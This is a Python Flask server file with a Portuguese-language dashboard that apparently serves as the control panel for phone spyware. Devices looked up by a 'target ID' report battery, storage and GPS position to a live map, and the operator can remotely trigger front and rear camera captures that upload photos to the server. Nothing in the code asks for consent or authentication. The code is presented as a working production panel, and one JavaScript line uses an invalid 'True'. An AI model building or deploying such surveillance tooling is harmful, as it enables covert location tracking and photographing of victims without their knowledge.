import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)
db_dispositivos = {}

HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXOS CORE // PRODUCTION PANEL</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #070f15; color: #e2e8f0; font-family: 'Courier New', monospace; padding: 15px; }
        .wrapper { max-width: 800px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 20px; padding: 10px; border-bottom: 2px solid #1e293b; }
        .header h1 { font-size: 20px; color: #38bdf8; letter-spacing: 3px; font-weight: bold; }
        
        .search-box { background: #0d1925; border: 1px solid #1e293b; padding: 20px; border-radius: 12px; text-align: center; margin-bottom: 20px; }
        .search-box input { width: 100%; max-width: 300px; background: #070f15; border: 1px solid #1e293b; padding: 12px; color: #34d399; font-weight: bold; text-align: center; border-radius: 6px; font-size: 16px; margin-bottom: 15px; letter-spacing: 2px; }
        .search-box button { background: #38bdf8; color: #070f15; font-weight: bold; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 13px; }
        
        .device-section { border: 1px solid #1e293b; border-radius: 12px; background: #0d1925; padding: 15px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.4); }
        .device-title { font-size: 14px; color: #34d399; text-transform: uppercase; border-bottom: 1px solid #1e293b; padding-bottom: 6px; margin-bottom: 12px; display: flex; justify-content: space-between; }
        
        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 12px; }
        .info-box { background: #070f15; border: 1px solid #1e293b; padding: 10px; border-radius: 6px; }
        .info-box span { font-size: 11px; color: #64748b; display: block; text-transform: uppercase; }
        .info-box strong { font-size: 16px; color: #f1f5f9; }
        
        .map-container { width: 100%; height: 260px; border-radius: 8px; background: #040a0f; border: 1px solid #1e293b; margin-bottom: 15px; }
        .btn-maps { display: block; width: 100%; background: #22c55e; color: #ffffff; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 13px; letter-spacing: 1px; margin-bottom: 15px; }
        
        .btn-camera { display: block; width: 100%; background: #38bdf8; color: #070f15; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; letter-spacing: 1px; cursor: pointer; margin-bottom: 20px; }
        
        /* ESTILO IGUAL AO DO SEU PRINT - CÂMERAS LADO A LADO */
        .cameras-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px; }
        @media(max-width: 600px) { .cameras-row { grid-template-columns: 1fr; } }
        
        .cam-card { background: #070f15; border: 1px solid #1e293b; border-radius: 8px; overflow: hidden; }
        .cam-card-title { background: #0d1925; padding: 8px; font-size: 11px; color: #64748b; border-bottom: 1px solid #1e293b; font-weight: bold; text-transform: uppercase; }
        .cam-frame { width: 100%; aspect-ratio: 4/3; background: #020609; display: flex; align-items: center; justify-content: center; }
        .cam-frame img { width: 100%; height: 100%; object-fit: cover; display: none; }
        .cam-placeholder { font-size: 11px; color: #334155; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="header">
            <h1>NEXOS // PRODUCTION PANEL</h1>
        </div>

        <div class="search-box">
            <p>DIGITE O SEU TARGET ID PARA ACESSAR O MONITORAMENTO</p>
            <form id="searchForm" method="POST">
                <input type="text" id="target_id" name="target_id" placeholder="EX: NX-A4B7D1" value="{{ id_buscado if id_buscado else '' }}" required><br>
                <button type="submit">Conectar Sinal</button>
            </form>
        </div>
        
        {% if info_moto %}
            <div class="device-section">
                <div class="device-title">
                    <span>CONEXÃO ATIVA // {{ id_buscado }}</span>
                    <span style="background: #166534; color: #4ade80; padding: 2px 8px; border-radius: 4px; font-size: 11px;">ONLINE</span>
                </div>
                
                <div class="info-grid">
                    <div class="info-box"><span>Bateria</span><strong id="txt_bateria" style="color: #22c55e;">{{ info_moto.battery }}%</strong></div>
                    <div class="info-box"><span>Espaço Livre</span><strong id="txt_storage">{{ info_moto.storage }}</strong></div>
                </div>
                
                <div id="map_private" class="map-container"></div>
                
                <a id="lnk_maps" href="https://www.google.com/maps?q={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn-maps">
                    🗺️ Abrir no Google Maps
                </a>

                <button id="btnCam" class="btn-camera" onclick="dispararCapturaDupla()">📸 Iniciar Captura Sincronizada</button>
                
                <div class="cameras-row">
                    <div class="cam-card">
                        <div class="cam-card-title">🎥 Câmera Frontal - Em Tempo Real</div>
                        <div class="cam-frame">
                            <span id="labelFront" class="cam-placeholder">Sem Sinal</span>
                            <img id="imgFront" src="" alt="Frontal">
                        </div>
                    </div>
                    <div class="cam-card">
                        <div class="cam-card-title">🎥 Câmera Traseira - Em Tempo Real</div>
                        <div class="cam-frame">
                            <span id="labelBack" class="cam-placeholder">Sem Sinal</span>
                            <img id="imgBack" src="" alt="Traseira">
                        </div>
                    </div>
                </div>
            </div>

            <script>
                let lastValidLat = {{ info_moto.lat }};
                let lastValidLon = {{ info_moto.lon }};
                
                const map = L.map('map_private', { zoomControl: false }).setView([lastValidLat, lastValidLon], 16);
                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {}).addTo(map);
                let marker = L.marker([lastValidLat, lastValidLon]).addTo(map);

                async function dispararCapturaDupla() {
                    const btn = document.getElementById('btnCam');
                    btn.innerText = "⏳ Sincronizando Lentes...";
                    btn.disabled = true;
                    
                    // Dispara comando global de foto dupla para o banco
                    await fetch('/api/comando_camera/{{ id_buscado }}', { 
                        method: 'POST', 
                        body: JSON.stringify({acao: 'take_dual'}), 
                        headers: {'Content-Type': 'application/json'} 
                    });
                    
                    // Monitora a chegada dos dois arquivos de forma independente
                    let checagem = setInterval(async () => {
                        try {
                            const res = await fetch('/api/get_camera/{{ id_buscado }}');
                            if (res.ok) {
                                const data = await res.json();
                                let atualizou_uma = false;
                                
                                if(data.photo_front) {
                                    document.getElementById('labelFront').style.display = "none";
                                    const imgF = document.getElementById('imgFront');
                                    imgF.src = "data:image/jpeg;base64," + data.photo_front;
                                    imgF.style.display = "block";
                                    atualizou_uma = True;
                                }
                                if(data.photo_back) {
                                    document.getElementById('labelBack').style.display = "none";
                                    const imgB = document.getElementById('imgBack');
                                    imgB.src = "data:image/jpeg;base64," + data.photo_back;
                                    imgB.style.display = "block";
                                    atualizou_uma = True;
                                }
                                
                                // Quando as duas fotos chegam ao servidor, libera o botão
                                if(data.pronto) {
                                    clearInterval(checagem);
                                    btn.innerText = "📸 Iniciar Captura Sincronizada";
                                    btn.disabled = false;
                                }
                            }
                        } catch(e){}
                    }, 1500);
                }

                setInterval(async () => {
                    try {
                        const response = await fetch('/api/status/' + '{{ id_buscado }}');
                        if (response.ok) {
                            const data = await response.json();
                            document.getElementById('txt_bateria').innerText = data.battery + '%';
                            document.getElementById('txt_storage').innerText = data.storage;
                            
                            let nextLat = parseFloat(data.lat);
                            let nextLon = parseFloat(data.lon);
                            if (!nextLat || !nextLon) return;
                            
                            lastValidLat = nextLat;
                            lastValidLon = nextLon;
                            const newPos = [lastValidLat, lastValidLon];
                            marker.setLatLng(newPos);
                            map.panTo(newPos);
                            document.getElementById('lnk_maps').href = 'https://www.google.com/maps?q=' + lastValidLat + ',' + lastValidLon;
                        }
                    } catch (e) {}
                }, 5000);
            </script>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    id_buscado = None
    info_moto = None
    erro = None
    if request.method == 'POST':
        id_buscado = request.form.get('target_id', '').strip()
        if id_buscado in db_dispositivos:
            info_moto = db_dispositivos[id_buscado]
        else:
            erro = "ID NAO ENCONTRADO"
    return render_template_string(HTML_DASHBOARD_PRIVADO, id_buscado=id_buscado, info_moto=info_moto, erro=erro)

@app.route('/api/status/<device_id>')
def api_status(device_id):
    if device_id in db_dispositivos:
        return jsonify(db_dispositivos[device_id]), 200
    return jsonify({"error": "Not found"}), 404

@app.route('/update', methods=['POST'])
def update():
    global db_dispositivos
    data = request.get_json(force=True, silent=True) or {}
    device_id = data.get('device_id')
    if not device_id: return jsonify({"status": "error"}), 400
    
    if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
        
    db_dispositivos[device_id]["battery"] = data.get("battery", "N/A")
    db_dispositivos[device_id]["storage"] = data.get("storage", "N/A")
    db_dispositivos[device_id]["lat"] = float(data.get("lat", -16.6869))
    db_dispositivos[device_id]["lon"] = float(data.get("lon", -49.2648))
    
    cmd_cam = db_dispositivos[device_id].get("cmd_cam", "wait")
    db_dispositivos[device_id]["cmd_cam"] = "wait"
    return jsonify({"status": "success", "comando_cam": cmd_cam}), 200

@app.route('/api/comando_camera/<device_id>', methods=['POST'])
def comando_camera(device_id):
    data = request.get_json(force=True, silent=True) or {}
    if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
    db_dispositivos[device_id]["cmd_cam"] = data.get("acao", "wait")
    # Limpa as fotos antigas para preparar o buffer das novas
    db_dispositivos[device_id]["photo_front"] = ""
    db_dispositivos[device_id]["photo_back"] = ""
    return jsonify({"status": "ok"}), 200

@app.route('/api/upload_camera', methods=['POST'])
def upload_camera():
    data = request.get_json(force=True, silent=True) or {}
    dev_id = data.get("device_id")
    tipo = data.get("tipo") # 'front' ou 'back'
    if dev_id and dev_id in db_dispositivos:
        db_dispositivos[dev_id][f"photo_{tipo}"] = data.get("photo")
    return jsonify({"status": "stored"}), 200

@app.route('/api/get_camera/<device_id>')
def get_camera(device_id):
    if device_id in db_dispositivos:
        pf = db_dispositivos[device_id].get("photo_front", "")
        pb = db_dispositivos[device_id].get("photo_back", "")
        # Está pronto se ambas as fotos já subiram
        pronto = True if (pf and pb) else False
        return jsonify({"photo_front": pf, "photo_back": pb, "pronto": pronto}), 200
    return jsonify({"photo_front": "", "photo_back": "", "pronto": False}), 404

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
